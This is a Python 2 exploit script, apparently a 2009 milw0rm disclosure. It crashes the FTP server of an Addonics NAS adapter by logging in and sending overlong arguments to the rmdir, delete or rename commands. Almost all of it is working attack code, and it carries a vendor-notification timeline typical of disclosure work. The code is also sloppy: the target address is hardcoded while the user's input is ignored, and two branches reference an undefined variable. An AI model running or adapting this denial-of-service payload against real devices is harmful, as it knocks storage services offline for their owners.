#!/usr/bin/python
######################################################
# Addonics NAS Adapter FTP server DoS
# Tested against NASU2FW41 Loader 1.17
# Coded by Mike Cyr, aka h00die
# mcyr2     at           csc         dot_____________com
# Notes: Since the HTTP server was so vulnerable, is
#        this really a suprise?
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification March 25, 2009
#      Vendor response March 26, 2009
#	   Milw0rm release May 1, 2009
######################################################

import socket
import sys

buffer= 'a'
counter=1

ip = raw_input("IP: ")
un = raw_input("Username: ")
password = raw_input("Password: ")

print "Vulnerable commands"
print "1. rmdir"
print "2. delete"
print "3. rename"
command = raw_input("Command to crash (#): ")

if command == "1":
	print "fuzzing " + ip + " with command rmdir"
elif command == "2":
	print "fuzzing " + ip + " with command delete"
elif command == "3":
	print "fuzzing " + ip + " with command rename"
else:
	print "your an idiot"
	sys.exit(1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.2.101',21))
print s.recv(1024)
s.send('USER ' + un + '\r\n')
print s.recv(1024)
s.send('PASS ' + password + '\r\n')
print s.recv(1024)
if command == "1":
	while len(buffer) <=512:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('XRMD ' + buffer + '\r\n')
	print 'rmdir ' + buffer + '\r\n'
elif command == "2":
	while len(buffer) <=523:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('delete ' + buffer + '\r\n')
elif command == "3":
	while len(buffer) <=526:
		buffer = buffer + 'a'
		counter=counter+1
	s.send('RNFR ' + buffer + '\r\n')
	answer=s.recv(1024)
	s.send('RNTO ' + buffer + '\r\n')
	answer=s.recv(1024)
if (answer == "550 Requested action not taken.\r\n"):
	print "Stack smashed"
else:
	print "fail: " + answer
s.close()

# milw0rm.com [2009-05-01]